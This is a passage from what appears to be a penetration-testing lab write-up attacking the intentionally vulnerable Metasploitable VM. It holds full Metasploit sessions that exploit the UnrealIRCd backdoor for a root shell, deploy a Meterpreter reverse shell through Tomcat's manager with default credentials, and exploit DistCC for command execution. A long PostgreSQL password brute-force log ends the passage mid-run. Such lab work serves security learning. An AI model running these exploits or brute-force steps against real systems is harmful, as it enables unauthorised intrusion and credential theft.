      True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0

*<span class="underline">Port 6667 - IRC</span>*  
The Metasploitable VM hosts an unreal IRC daemon on port 6667. There
appeared to be only one exploit available for this service on the
metasploit framework so it was worth giving it a go, even without
investigating to see if the daemon was vulnerable. The exploit gives
root shell access  

    msf > search unreal

    Matching Modules
    ================

       Name                                        Disclosure Date          Rank       Description
       ----                                        ---------------          ----       -----------
       exploit/linux/games/ut2004_secure           2004-06-18 00:00:00 UTC  good       Unreal Tournament 2004 "secure" Overflow (Linux)
       exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12 00:00:00 UTC  excellent  UnrealIRCD 3.2.8.1 Backdoor Command Execution
       exploit/windows/games/ut2004_secure         2004-06-18 00:00:00 UTC  good       Unreal Tournament 2004 "secure" Overflow (Win32)


    msf > use exploit/unix/irc/unreal_ircd_3281_backdoor 
    msf  exploit(unreal_ircd_3281_backdoor) > show options

    Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

       Name   Current Setting  Required  Description
       ----   ---------------  --------  -----------
       RHOST                   yes       The target address
       RPORT  6667             yes       The target port


    Exploit target:

       Id  Name
       --  ----
       0   Automatic Target


    msf  exploit(unreal_ircd_3281_backdoor) > set RHOST 192.168.32.102
    RHOST => 192.168.32.102
    msf  exploit(unreal_ircd_3281_backdoor) > exploit

    [*] Started reverse double handler
    [*] Connected to 192.168.32.102:6667...
        :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
        :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
    [*] Sending backdoor command...
    [*] Accepted the first client connection...
    [*] Accepted the second client connection...
    [*] Command: echo JnP3tybMkkFXcaXc;
    [*] Writing to socket A
    [*] Writing to socket B
    [*] Reading from sockets...
    [*] Reading from socket B
    [*] B: "JnP3tybMkkFXcaXc\r\n"
    [*] Matching...
    [*] A is input...
    [*] Command shell session 7 opened (192.168.32.101:4444 -> 192.168.32.102:39764) at 2015-02-05 18:25:10 +1000

    id
    uid=0(root) gid=0(root)
    pwd
    /etc/unreal

  
*<span class="underline">Port 8009 - Tomcat</span>*  
Port 8009 is a tomcat reverse proxy that apache uses to communicate with
Tomcat to server pages. Port 8180 runs the main admin interface for
Tomcat. We need to get the admin credentials  

    msf > use auxiliary/admin/http/tomcat_administration
    msf  auxiliary(tomcat_administration) > show options

    Module options (auxiliary/admin/http/tomcat_administration):

       Name         Current Setting  Required  Description
       ----         ---------------  --------  -----------
       Proxies                       no        Use a proxy chain
       RHOSTS       192.168.32.102   yes       The target address range or CIDR identifier
       RPORT        8180             yes       The target port
       THREADS      1                yes       The number of concurrent threads
       TOMCAT_PASS                   no        The password for the specified username
       TOMCAT_USER                   no        The username to authenticate as
       VHOST                         no        HTTP server virtual host

    msf  auxiliary(tomcat_administration) > exploit

    [*] http://192.168.32.102:8180/admin [Apache-Coyote/1.1] [Apache Tomcat/5.5] [Tomcat Server Administration] [tomcat/tomcat]
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
    msf  auxiliary(tomcat_administration) > 

  
Now we can use the credentials, i.e. username tomcat with password
tomcat to exploit the management interface  

    msf > use exploit/multi/http/tomcat_mgr_deploy
    msf  exploit(tomcat_mgr_deploy) > show options

    Module options (exploit/multi/http/tomcat_mgr_deploy):

       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       PASSWORD                   no        The password for the specified username
       PATH      /manager         yes       The URI path of the manager app (/deploy and /undeploy will be used)
       Proxies                    no        Use a proxy chain
       RHOST     192.168.32.102   yes       The target address
       RPORT     8180             yes       The target port
       USERNAME                   no        The username to authenticate as
       VHOST                      no        HTTP server virtual host


    Payload options (java/meterpreter/reverse_tcp):

       Name   Current Setting  Required  Description
       ----   ---------------  --------  -----------
       LHOST  192.168.32.101   yes       The listen address
       LPORT  4444             yes       The listen port


    Exploit target:

       Id  Name
       --  ----
       0   Automatic


    msf  exploit(tomcat_mgr_deploy) > set PASSWORD tomcat
    PASSWORD => tomcat
    msf  exploit(tomcat_mgr_deploy) > set USERNAME tomcat
    USERNAME => tomcat
    msf  exploit(tomcat_mgr_deploy) > exploit

    [*] Started reverse handler on 192.168.32.101:4444 
    [*] Attempting to automatically select a target...
    [*] Automatically selected target "Linux x86"
    [*] Uploading 6474 bytes as SuXSLiYpW36ClmwLOKbAfVYNlU5Q.war ...
    [*] Executing /SuXSLiYpW36ClmwLOKbAfVYNlU5Q/m6RuB34P9qma.jsp...
    [*] Undeploying SuXSLiYpW36ClmwLOKbAfVYNlU5Q ...
    [*] Sending stage (30216 bytes) to 192.168.32.102
    [*] Meterpreter session 8 opened (192.168.32.101:4444 -> 192.168.32.102:52522) at 2015-02-05 19:33:31 +1000

    meterpreter >  getuid
    Server username: tomcat55
    meterpreter >

  
*<span class="underline">Port 3632 - DistCC</span>*  
DistCC daemon can be exploited to allow remote code execution.  
  

    msf > search distcc

    Matching Modules
    ================

       Name                           Disclosure Date          Rank       Description
       ----                           ---------------          ----       -----------
       exploit/unix/misc/distcc_exec  2002-02-01 00:00:00 UTC  excellent  DistCC Daemon Command Execution


    msf > use exploit/unix/misc/distcc_exec
    msf  exploit(distcc_exec) > show options

    Module options (exploit/unix/misc/distcc_exec):

       Name   Current Setting  Required  Description
       ----   ---------------  --------  -----------
       RHOST                   yes       The target address
       RPORT  3632             yes       The target port


    Exploit target:

       Id  Name
       --  ----
       0   Automatic Target


    msf  exploit(distcc_exec) > set RHOST 192.168.32.102
    RHOST => 192.168.32.102
    msf  exploit(distcc_exec) > set PAYLOAD cmd/unix/reverse
    PAYLOAD => cmd/unix/reverse
    msf  exploit(distcc_exec) > set LHOST 192.168.32.101
    LHOST => 192.168.32.101
    msf  exploit(distcc_exec) > exploit

    [*] Started reverse double handler
    [*] Accepted the first client connection...
    [*] Accepted the second client connection...
    [*] Command: echo f26y6z3GQB0TouQp;
    [*] Writing to socket A
    [*] Writing to socket B
    [*] Reading from sockets...
    [*] Reading from socket B
    [*] B: "f26y6z3GQB0TouQp\r\n"
    [*] Matching...
    [*] A is input...
    [*] Command shell session 5 opened (192.168.32.101:4444 -> 192.168.32.102:45917) at 2015-02-04 19:38:56 +1000

    id
    uid=1(daemon) gid=1(daemon) groups=1(daemon)
    pwd
    /tmp

  
*<span class="underline">Port 5432 - Postgresql</span>*  
PostgreSQL DB 8.3.0 - 8.3.7 is listening on port 5432. Since the MySQL
database was not password protected, chances are Postgresql may not be
password protected either, but we've cracked some of the passwords, so
it may be worth trying to brute force the password. First we attempted
to use the metasploit wordlist, and then repeated with the list of
usernames we has recovered. Unfortunately no additional credentials were
recovered, save for the postgres:postgres credentials for the template1
database.  
  

    msf > search postgreSQL

    Matching Modules
    ================

       Name                                          Disclosure Date          Rank       Description
       ----                                          ---------------          ----       -----------
       auxiliary/admin/http/rails_devise_pass_reset  2013-01-28 00:00:00 UTC  normal     Ruby on Rails Devise Authentication Password Reset
       auxiliary/admin/postgres/postgres_readfile                             normal     PostgreSQL Server Generic Query
       auxiliary/admin/postgres/postgres_sql                                  normal     PostgreSQL Server Generic Query
       auxiliary/scanner/postgres/postgres_login                              normal     PostgreSQL Login Utility
       auxiliary/scanner/postgres/postgres_version                            normal     PostgreSQL Version Probe
       auxiliary/server/capture/postgresql                                    normal     Authentication Capture: PostgreSQL
       exploit/linux/postgres/postgres_payload       2007-06-05 00:00:00 UTC  excellent  PostgreSQL for Linux Payload Execution
       exploit/windows/postgres/postgres_payload     2009-04-10 00:00:00 UTC  excellent  PostgreSQL for Microsoft Windows Payload Execution


    msf > use auxiliary/scanner/postgres/postgres_login
    msf  auxiliary(postgres_login) > show options

    Module options (auxiliary/scanner/postgres/postgres_login):

       Name              Current Setting                                                             Required  Description
       ----              ---------------                                                             --------  -----------
       BLANK_PASSWORDS   true                                                                        no        Try blank passwords for all users
       BRUTEFORCE_SPEED  5                                                                           yes       How fast to bruteforce, from 0 to 5
       DATABASE          template1                                                                   yes       The database to authenticate against
       PASSWORD                                                                                      no        A specific password to authenticate with
       PASS_FILE         /opt/metasploit/apps/pro/msf3/data/wordlists/postgres_default_pass.txt      no        File containing passwords, one per line
       RETURN_ROWSET     true                                                                        no        Set to true to see query result sets
       RHOSTS            192.168.32.102                                                              yes       The target address range or CIDR identifier
       RPORT             5432                                                                        yes       The target port
       STOP_ON_SUCCESS   false                                                                       yes       Stop guessing when a credential works for a host
       THREADS           1                                                                           yes       The number of concurrent threads
       USERNAME          postgres                                                                    no        A specific username to authenticate as
       USERPASS_FILE     /opt/metasploit/apps/pro/msf3/data/wordlists/postgres_default_userpass.txt  no        File containing (space-seperated) users and passwords, one pair per line
       USER_AS_PASS      true                                                                        no        Try the username as the password for all users
       USER_FILE         /opt/metasploit/apps/pro/msf3/data/wordlists/postgres_default_user.txt      no        File containing users, one per line
       VERBOSE           true                                                                        yes       Whether to print output for all attempts

    msf  auxiliary(postgres_login) > run

    [*] 192.168.32.102:5432 Postgres - [01/21] - Trying username:'postgres' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'postgres':''
    [-] 192.168.32.102:5432 Postgres - [01/21] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [02/21] - Trying username:'' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: '':''
    [-] 192.168.32.102:5432 Postgres - [02/21] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [03/21] - Trying username:'scott' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'scott':''
    [-] 192.168.32.102:5432 Postgres - [03/21] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [04/21] - Trying username:'admin' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'admin':''
    [-] 192.168.32.102:5432 Postgres - [04/21] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [05/21] - Trying username:'postgres' with password:'postgres' on database 'template1'
    [+] 192.168.32.102:5432 Postgres - Logged in to 'template1' with 'postgres':'postgres'
    [+] 192.168.32.102:5432 Postgres - Success: postgres:postgres (Database 'template1' succeeded.)
    [*] 192.168.32.102:5432 Postgres - Disconnected
    [*] 192.168.32.102:5432 Postgres - [06/21] - Trying username:'scott' with password:'scott' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'scott':'scott'
    [-] 192.168.32.102:5432 Postgres - [06/21] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [07/21] - Trying username:'admin' with password:'admin' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'admin':'admin'
    [-] 192.168.32.102:5432 Postgres - [07/21] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [08/21] - Trying username:'admin' with password:'password' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'admin':'password'
    [-] 192.168.32.102:5432 Postgres - [08/21] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [09/21] - Trying username:'' with password:'tiger' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: '':'tiger'
    [-] 192.168.32.102:5432 Postgres - [09/21] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [10/21] - Trying username:'' with password:'postgres' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: '':'postgres'
    [-] 192.168.32.102:5432 Postgres - [10/21] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [11/21] - Trying username:'' with password:'password' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: '':'password'
    [-] 192.168.32.102:5432 Postgres - [11/21] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [12/21] - Trying username:'' with password:'admin' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: '':'admin'
    [-] 192.168.32.102:5432 Postgres - [12/21] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [13/21] - Trying username:'scott' with password:'tiger' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'scott':'tiger'
    [-] 192.168.32.102:5432 Postgres - [13/21] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [14/21] - Trying username:'scott' with password:'postgres' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'scott':'postgres'
    [-] 192.168.32.102:5432 Postgres - [14/21] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [15/21] - Trying username:'scott' with password:'password' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'scott':'password'
    [-] 192.168.32.102:5432 Postgres - [15/21] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [16/21] - Trying username:'scott' with password:'admin' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'scott':'admin'
    [-] 192.168.32.102:5432 Postgres - [16/21] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [17/21] - Trying username:'admin' with password:'tiger' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'admin':'tiger'
    [-] 192.168.32.102:5432 Postgres - [17/21] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [18/21] - Trying username:'admin' with password:'postgres' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'admin':'postgres'
    [-] 192.168.32.102:5432 Postgres - [18/21] - Username/Password failed.
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
    msf  auxiliary(postgres_login) > set USERPASS_FILE /root/Desktop/metasploitable2/users.txt 
    USERPASS_FILE => /root/Desktop/metasploitable2/users.txt
    msf  auxiliary(postgres_login) > unset PASS_FILE
    Unsetting PASS_FILE...
    msf  auxiliary(postgres_login) > unset USER_FILE
    Unsetting USER_FILE...
    msf  auxiliary(postgres_login) > run

    [*] 192.168.32.102:5432 Postgres - [01/74] - Trying username:'postgres' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'postgres':''
    [-] 192.168.32.102:5432 Postgres - [01/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [02/74] - Trying username:'root' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'root':''
    [-] 192.168.32.102:5432 Postgres - [02/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [03/74] - Trying username:'daemon' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'daemon':''
    [-] 192.168.32.102:5432 Postgres - [03/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [04/74] - Trying username:'bin' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'bin':''
    [-] 192.168.32.102:5432 Postgres - [04/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [05/74] - Trying username:'sys' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'sys':''
    [-] 192.168.32.102:5432 Postgres - [05/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [06/74] - Trying username:'sync' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'sync':''
    [-] 192.168.32.102:5432 Postgres - [06/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [07/74] - Trying username:'games' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'games':''
    [-] 192.168.32.102:5432 Postgres - [07/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [08/74] - Trying username:'man' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'man':''
    [-] 192.168.32.102:5432 Postgres - [08/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [09/74] - Trying username:'lp' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'lp':''
    [-] 192.168.32.102:5432 Postgres - [09/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [10/74] - Trying username:'mail' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'mail':''
    [-] 192.168.32.102:5432 Postgres - [10/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [11/74] - Trying username:'news' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'news':''
    [-] 192.168.32.102:5432 Postgres - [11/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [12/74] - Trying username:'uucp' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'uucp':''
    [-] 192.168.32.102:5432 Postgres - [12/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [13/74] - Trying username:'proxy' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'proxy':''
    [-] 192.168.32.102:5432 Postgres - [13/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [14/74] - Trying username:'www-data' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'www-data':''
    [-] 192.168.32.102:5432 Postgres - [14/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [15/74] - Trying username:'backup' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'backup':''
    [-] 192.168.32.102:5432 Postgres - [15/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [16/74] - Trying username:'list' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'list':''
    [-] 192.168.32.102:5432 Postgres - [16/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [17/74] - Trying username:'irc' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'irc':''
    [-] 192.168.32.102:5432 Postgres - [17/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [18/74] - Trying username:'gnats' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'gnats':''
    [-] 192.168.32.102:5432 Postgres - [18/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [19/74] - Trying username:'nobody' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'nobody':''
    [-] 192.168.32.102:5432 Postgres - [19/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [20/74] - Trying username:'libuuid' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'libuuid':''
    [-] 192.168.32.102:5432 Postgres - [20/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [21/74] - Trying username:'dhcp' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'dhcp':''
    [-] 192.168.32.102:5432 Postgres - [21/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [22/74] - Trying username:'syslog' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'syslog':''
    [-] 192.168.32.102:5432 Postgres - [22/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [23/74] - Trying username:'klog' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'klog':''
    [-] 192.168.32.102:5432 Postgres - [23/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [24/74] - Trying username:'sshd' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'sshd':''
    [-] 192.168.32.102:5432 Postgres - [24/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [25/74] - Trying username:'msfadmin' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'msfadmin':''
    [-] 192.168.32.102:5432 Postgres - [25/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [26/74] - Trying username:'bind' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'bind':''
    [-] 192.168.32.102:5432 Postgres - [26/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [27/74] - Trying username:'postfix' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'postfix':''
    [-] 192.168.32.102:5432 Postgres - [27/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [28/74] - Trying username:'ftp' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'ftp':''
    [-] 192.168.32.102:5432 Postgres - [28/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [29/74] - Trying username:'mysql' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'mysql':''
    [-] 192.168.32.102:5432 Postgres - [29/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [30/74] - Trying username:'tomcat55' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'tomcat55':''
    [-] 192.168.32.102:5432 Postgres - [30/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [31/74] - Trying username:'distccd' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'distccd':''
    [-] 192.168.32.102:5432 Postgres - [31/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [32/74] - Trying username:'user' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'user':''
    [-] 192.168.32.102:5432 Postgres - [32/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [33/74] - Trying username:'service' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'service':''
    [-] 192.168.32.102:5432 Postgres - [33/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [34/74] - Trying username:'telnetd' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'telnetd':''
    [-] 192.168.32.102:5432 Postgres - [34/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [35/74] - Trying username:'proftpd' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'proftpd':''
    [-] 192.168.32.102:5432 Postgres - [35/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [36/74] - Trying username:'statd' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'statd':''
    [-] 192.168.32.102:5432 Postgres - [36/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [37/74] - Trying username:'snmp' with password:'' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'snmp':''
    [-] 192.168.32.102:5432 Postgres - [37/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [38/74] - Trying username:'postgres' with password:'postgres' on database 'template1'
    [+] 192.168.32.102:5432 Postgres - Logged in to 'template1' with 'postgres':'postgres'
    [+] 192.168.32.102:5432 Postgres - Success: postgres:postgres (Database 'template1' succeeded.)
    [*] 192.168.32.102:5432 Postgres - Disconnected
    [*] 192.168.32.102:5432 Postgres - [39/74] - Trying username:'root' with password:'root' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'root':'root'
    [-] 192.168.32.102:5432 Postgres - [39/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [40/74] - Trying username:'daemon' with password:'daemon' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'daemon':'daemon'
    [-] 192.168.32.102:5432 Postgres - [40/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [41/74] - Trying username:'bin' with password:'bin' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'bin':'bin'
    [-] 192.168.32.102:5432 Postgres - [41/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [42/74] - Trying username:'sys' with password:'sys' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'sys':'sys'
    [-] 192.168.32.102:5432 Postgres - [42/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [43/74] - Trying username:'sync' with password:'sync' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'sync':'sync'
    [-] 192.168.32.102:5432 Postgres - [43/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [44/74] - Trying username:'games' with password:'games' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'games':'games'
    [-] 192.168.32.102:5432 Postgres - [44/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [45/74] - Trying username:'man' with password:'man' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'man':'man'
    [-] 192.168.32.102:5432 Postgres - [45/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [46/74] - Trying username:'lp' with password:'lp' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'lp':'lp'
    [-] 192.168.32.102:5432 Postgres - [46/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [47/74] - Trying username:'mail' with password:'mail' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'mail':'mail'
    [-] 192.168.32.102:5432 Postgres - [47/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [48/74] - Trying username:'news' with password:'news' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'news':'news'
    [-] 192.168.32.102:5432 Postgres - [48/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [49/74] - Trying username:'uucp' with password:'uucp' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'uucp':'uucp'
    [-] 192.168.32.102:5432 Postgres - [49/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [50/74] - Trying username:'proxy' with password:'proxy' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'proxy':'proxy'
    [-] 192.168.32.102:5432 Postgres - [50/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [51/74] - Trying username:'www-data' with password:'www-data' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'www-data':'www-data'
    [-] 192.168.32.102:5432 Postgres - [51/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [52/74] - Trying username:'backup' with password:'backup' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'backup':'backup'
    [-] 192.168.32.102:5432 Postgres - [52/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [53/74] - Trying username:'list' with password:'list' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'list':'list'
    [-] 192.168.32.102:5432 Postgres - [53/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [54/74] - Trying username:'irc' with password:'irc' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'irc':'irc'
    [-] 192.168.32.102:5432 Postgres - [54/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [55/74] - Trying username:'gnats' with password:'gnats' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'gnats':'gnats'
    [-] 192.168.32.102:5432 Postgres - [55/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [56/74] - Trying username:'nobody' with password:'nobody' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'nobody':'nobody'
    [-] 192.168.32.102:5432 Postgres - [56/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [57/74] - Trying username:'libuuid' with password:'libuuid' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'libuuid':'libuuid'
    [-] 192.168.32.102:5432 Postgres - [57/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [58/74] - Trying username:'dhcp' with password:'dhcp' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'dhcp':'dhcp'
    [-] 192.168.32.102:5432 Postgres - [58/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [59/74] - Trying username:'syslog' with password:'syslog' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'syslog':'syslog'
    [-] 192.168.32.102:5432 Postgres - [59/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [60/74] - Trying username:'klog' with password:'klog' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'klog':'klog'
    [-] 192.168.32.102:5432 Postgres - [60/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [61/74] - Trying username:'sshd' with password:'sshd' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'sshd':'sshd'
    [-] 192.168.32.102:5432 Postgres - [61/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [62/74] - Trying username:'msfadmin' with password:'msfadmin' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'msfadmin':'msfadmin'
    [-] 192.168.32.102:5432 Postgres - [62/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [63/74] - Trying username:'bind' with password:'bind' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'bind':'bind'
    [-] 192.168.32.102:5432 Postgres - [63/74] - Username/Password failed.
    [*] 192.168.32.102:5432 Postgres - [64/74] - Trying username:'postfix' with password:'postfix' on database 'template1'
    [-] 192.168.32.102:5432 Postgres - Invalid username or password: 'postfix':'postfix'
